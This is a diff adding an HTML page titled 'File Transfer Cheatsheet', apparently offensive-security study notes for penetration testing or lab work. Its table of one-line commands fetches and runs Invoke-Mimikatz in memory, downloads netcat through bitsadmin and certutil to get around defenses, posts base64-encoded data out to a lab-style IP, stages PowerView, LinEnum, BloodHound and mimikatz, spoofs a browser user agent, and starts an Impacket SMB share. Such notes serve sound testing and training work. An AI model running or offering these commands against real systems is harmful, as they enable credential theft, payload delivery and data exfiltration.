@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Transfer Cheatsheet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            padding: 20px;
+            max-width: 800px;
+            margin: auto;
+            background-color: #000;
+            color: #0f0;
+            background-image: url('https://www.transparenttextures.com/patterns/asfalt-light.png');
+        }
+        h1, h2, h3, h4, h5, h6 {
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 0.3em;
+            margin-top: 1.5em;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+        table, th, td {
+            border: 1px solid #0f0;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: rgba(0, 255, 0, 0.2);
+        }
+        code {
+            background-color: #333;
+            color: #0f0;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+        pre {
+            background-color: #333;
+            color: #0f0;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+        blockquote {
+            border-left: 4px solid #0f0;
+            padding-left: 1em;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <h1>File Transfer Cheatsheet</h1>
+
+    <table>
+        <tr>
+            <th>Command</th>
+            <th>Description</th>
+        </tr>
+        <tr>
+            <td><code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code></td>
+            <td>Download a file with PowerShell</td>
+        </tr>
+        <tr>
+            <td><code>IEX (New-Object Net.WebClient).DownloadString('https://&lt;snip&gt;/Invoke-Mimikatz.ps1')</code></td>
+            <td>Execute a file in memory using PowerShell</td>
+        </tr>
+        <tr>
+            <td><code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code></td>
+            <td>Upload a file with PowerShell</td>
+        </tr>
+        <tr>
+            <td><code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe</code></td>
+            <td>Download a file using Bitsadmin</td>
+        </tr>
+        <tr>
+            <td><code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code></td>
+            <td>Download a file using Certutil</td>
+        </tr>
+        <tr>
+            <td><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></td>
+            <td>Download a file using Wget</td>
+        </tr>
+        <tr>
+            <td><code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></td>
+            <td>Download a file using cURL</td>
+        </tr>
+        <tr>
+            <td><code>php -r '$file = file_get_contents("https://&lt;snip&gt;/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'</code></td>
+            <td>Download a file using PHP</td>
+        </tr>
+        <tr>
+            <td><code>scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code></td>
+            <td>Upload a file using SCP</td>
+        </tr>
+        <tr>
+            <td><code>scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe</code></td>
+            <td>Download a file using SCP</td>
+        </tr>
+        <tr>
+            <td><code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"</code></td>
+            <td>Invoke-WebRequest using a Chrome User Agent</td>
+        </tr>
+        <tr>
+            <td><code>sudo impacket-smbserver -smb2support share /home/parrot/Downloads/</code></td>
+            <td>Start an SMB server with Impacket</td>
+        </tr>
+    </table>
+</body>
+</html>
